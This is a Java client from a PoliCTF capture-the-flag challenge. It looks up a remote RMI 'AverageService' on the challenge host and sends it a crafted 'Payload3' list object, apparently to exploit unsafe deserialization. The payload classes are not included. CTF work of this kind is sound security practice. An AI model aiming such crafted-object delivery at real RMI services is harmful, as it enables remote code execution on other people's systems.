package it.polictf.lamermi;

import java.util.*;
import java.rmi.registry.*;

public class MyClient {

	public static void main(String[] args) throws Exception {
		Registry registry = LocateRegistry.getRegistry("lamermi.chall.polictf.it");
		AverageService service = (AverageService) registry.lookup("AverageService");

		// List<Integer> list = new ArrayList<Integer>();
		// List<Integer> list = new Payload0();
		// List<Integer> list = new Payload1();
		// List<Integer> list = new Payload2();
		List<Integer> list = new Payload3();
		list.add(1);
		list.add(2);
		Double result = service.average(list);

		System.out.println("Result: " + result);
	}
}
